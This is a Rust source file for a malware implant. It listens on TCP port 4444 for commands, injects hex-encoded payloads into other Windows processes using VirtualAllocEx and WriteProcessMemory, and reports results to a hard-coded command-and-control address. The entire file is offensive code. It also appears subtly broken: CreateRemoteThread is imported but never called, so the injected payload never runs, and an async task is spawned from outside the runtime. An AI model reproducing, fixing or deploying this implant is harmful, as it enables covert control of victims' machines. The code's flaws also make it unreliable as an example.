use std::io::{self, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::thread;
use std::time::Duration;
use std::sync::{Arc, Mutex};
use reqwest::Client;
use tokio::time::sleep;
use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread};
use winapi::um::winnt::{PROCESS_ALL_ACCESS, MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::handleapi::CloseHandle;
use lazy_static::lazy_static;
use anyhow::{Result, Context};
use hex;

lazy_static! {
    static ref CLIENT: Arc<Client> = Arc::new(Client::new());
    static ref EXIT_FLAG: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
    static ref AGENT_ID: Arc<String> = Arc::new("Agent1".to_string());
}

async fn send_data_to_c2(data: &str) -> Result<()> {
    let url = format!("http://192.168.1.117:8080/output/{}", AGENT_ID.as_ref());
    let client = Arc::clone(&CLIENT);
    
    let response = client
        .post(&url)
        .body(data.to_string())
        .send()
        .await
        .context("Failed to send data to C2 server")?;
    
    response.error_for_status_ref()?;
    Ok(())
}

fn listen_for_commands(exit_flag: Arc<Mutex<bool>>) -> Result<()> {
    let listener = TcpListener::bind("0.0.0.0:4444")?;
    println!("Listening on port 4444 for incoming connections...");

    for stream in listener.incoming() {
        match stream {
            Ok(mut stream) => {
                println!("Connection established with {:?}", stream.peer_addr());

                let mut buffer = [0; 1024];
                loop {
                    match stream.read(&mut buffer) {
                        Ok(0) => break, // No more data, exit loop
                        Ok(bytes_read) => {
                            let command = String::from_utf8_lossy(&buffer[..bytes_read]).to_string();

                            match command.as_str() {
                                "exit" => {
                                    println!("Received exit command. Terminating.");
                                    *exit_flag.lock().unwrap() = true;
                                    break;
                                }
                                cmd if cmd.starts_with("inject") => {
                                    let parts: Vec<&str> = cmd.split_whitespace().collect();
                                    if parts.len() != 3 {
                                        println!("Invalid inject command. Usage: inject <pid> <payload>");
                                        continue;
                                    }
                                    let pid: u32 = match parts[1].parse() {
                                        Ok(pid) => pid,
                                        Err(_) => {
                                            println!("Invalid PID");
                                            continue;
                                        }
                                    };
                                    let payload = match hex::decode(parts[2]) {
                                        Ok(payload) => payload,
                                        Err(_) => {
                                            println!("Failed to decode payload. Ensure it's a valid hex string.");
                                            continue;
                                        }
                                    };
                                    if let Err(e) = inject_into_existing_process(pid, &payload) {
                                        println!("Failed to inject payload: {}", e);
                                        continue;
                                    }
                                    println!("Injection successful.");
                                    let output = format!("Injected payload into process {}", pid);
                                    tokio::spawn(async move { send_data_to_c2(&output).await.unwrap() });
                                }
                                _ => {
                                    println!("Unknown command: {}", command);
                                }
                            }

                            let response = format!("Executed command: {}", command);
                            stream.write_all(response.as_bytes())?;
                        }
                        Err(e) => {
                            eprintln!("Error reading from stream: {}", e);
                            break;
                        }
                    }
                }
            }
            Err(e) => eprintln!("Connection failed: {}", e),
        }
    }
    Ok(())
}

fn inject_into_existing_process(pid: u32, payload: &[u8]) -> Result<()> {
    unsafe {
        let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if h_process.is_null() {
            return Err(anyhow::anyhow!("Failed to open process").into());
        }
        let mem = VirtualAllocEx(h_process, std::ptr::null_mut(), payload.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if mem.is_null() {
            CloseHandle(h_process);
            return Err(anyhow::anyhow!("Failed to allocate memory in target process").into());
        }

        let mut written = 0;
        if WriteProcessMemory(h_process, mem, payload.as_ptr() as *const _, payload.len(), &mut written) == 0 {
            CloseHandle(h_process);
            return Err(anyhow::anyhow!("Failed to write to process memory").into());
        }

        // Optional: You may want to ensure the memory is freed or properly managed afterward
        CloseHandle(h_process);
        Ok(())
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let exit_flag = Arc::clone(&EXIT_FLAG);
    thread::spawn(move || {
        listen_for_commands(exit_flag).unwrap();
    });
    loop {
        if *EXIT_FLAG.lock().unwrap() {
            break;
        }
        tokio::time::sleep(Duration::from_secs(20)).await; // Sleep for 20 seconds before checking again
    }
    Ok(())
}
